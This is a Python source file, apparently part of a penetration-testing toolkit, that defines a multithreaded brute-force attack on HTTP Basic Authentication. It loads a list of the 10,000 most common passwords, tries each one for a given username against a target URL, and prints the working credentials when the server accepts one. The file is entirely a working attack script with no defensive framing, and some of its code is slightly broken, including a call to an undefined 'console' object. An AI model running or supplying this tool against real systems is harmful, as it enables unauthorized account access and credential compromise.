#! /usr/bin/python

import requests
from requests.auth import HTTPBasicAuth
import os
import sys
import time
import colors
import threading
import multiprocessing


class BruteforceLogin(object):
    """
    Try to login with given usernames and the most common passwords through
    authorization header.
    """
    def __init__(self, url, threads, user):
        self.m = multiprocessing.Manager()
        self.url = url
        self.username = user
        self.passwords_queue = self.m.Queue()
        self.found_password = False

        if threads is not None:
            threads = int(threads)
            self.threadValidator(threads)
        else:
            self.threads = 1

    def threadValidator(self, threads):
        """
        Validates the number of threads
        """
        if threads > 100:
            choice = input('Are you sure you want to use {} threads...?'
                           'This can slow down your system.(Y/N)'
                           .format(threads))
            if choice == 'N' or choice == 'n':
                threads = int(input('>> Please enter the number of threads'
                                    ' you want to use...'))
                self.threadValidator(threads)
            else:
                self.threads = threads
        else:
            self.threads = threads

    def read_dictionary(self):
        try:
            self.dictionary_path = os.getcwd() +\
                                   '/payloads/10k-most-common-passwords.txt'
            if not os.path.exists(self.dictionary_path):
                raise Exception("Dictionary does not exist")
        except Exception as e:
            colors.error(e)
            sys.exit(1)

        with open(self.dictionary_path) as file:
            for password in file.readlines():
                self.passwords_queue.put(password.strip())

    def bruteforce(self):
        while not self.passwords_queue.empty() and\
              self.found_password is not True:
            password = self.passwords_queue.get()
            req = requests.get(self.url, auth=HTTPBasicAuth(self.username,
                                                            password))
            if req.status_code == 401:
                print("Testing password: {} Failed!".format(password))
            elif req.status_code == 200:
                self.password = password
                self.found_password = True
            else:
                console.error("Error occurred with password {}"
                              .format(password))

    def startAttack(self):
        self.read_dictionary()
        t1 = time.time()

        threads = []

        colors.info('Brute Force Login started...')

        for _ in range(self.threads):
            newThread = threading.Thread(target=self.bruteforce)
            newThread.start()
            threads.append(newThread)

        for thread in threads:
            thread.join()

        t2 = time.time()

        colors.success("Login successful using {} as username "
                       "and {} as password".format(self.username,
                                                   self.password))

        colors.info('Successfully completed in : {} seconds.'.format(t2-t1))
